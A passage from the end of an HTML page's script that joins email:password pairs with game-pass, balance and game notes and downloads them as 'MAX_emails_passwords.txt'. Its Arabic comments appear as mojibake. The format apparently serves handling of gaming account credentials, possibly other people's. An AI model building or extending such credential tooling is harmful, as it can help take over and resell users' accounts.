            // Ø¬Ù…Ø¹ ÙƒÙ„ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª (GP Ùˆ Ø§Ù„Ø±ØµÙŠØ¯ Ùˆ Ø§Ù„Ø£Ù„Ø¹Ø§Ø¨)
            const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .game-guess-note')]
                          .map(span => span.textContent.trim())
                          .join('');

            return email + ":" + password + notes; 
        }).join("\n");
        
        const o = new Blob([t], { type: "text/plain;charset=utf-8" }), n = URL.createObjectURL(o), c = document.createElement("a");
        c.href = n, c.download = "MAX_emails_passwords.txt", c.click(), URL.revokeObjectURL(n), showToast("ØªÙ… ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù Ø¨Ù†Ø¬Ø§Ø­");
    };

    // Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©ØŒ Ø§Ù„Ø£Ø¯Ø§Ø© ØªØ¸Ù‡Ø± Ù…Ø¨Ø§Ø´Ø±Ø©
    window.onload = () => {
        // Ø¨Ù…Ø§ Ø£Ù† Ø§Ù„Ø£Ø¯Ø§Ø© Ù…ÙØªÙˆØ­Ø© Ù…Ø¨Ø§Ø´Ø±Ø©ØŒ Ù…Ø§ÙƒÙˆ Ø¯Ø§Ø¹ÙŠ Ù†Ø³ÙˆÙŠ Ø£ÙŠ Ø´ÙŠØ¡ Ù‡Ù†Ø§
    };
</script>
</body>
</html>
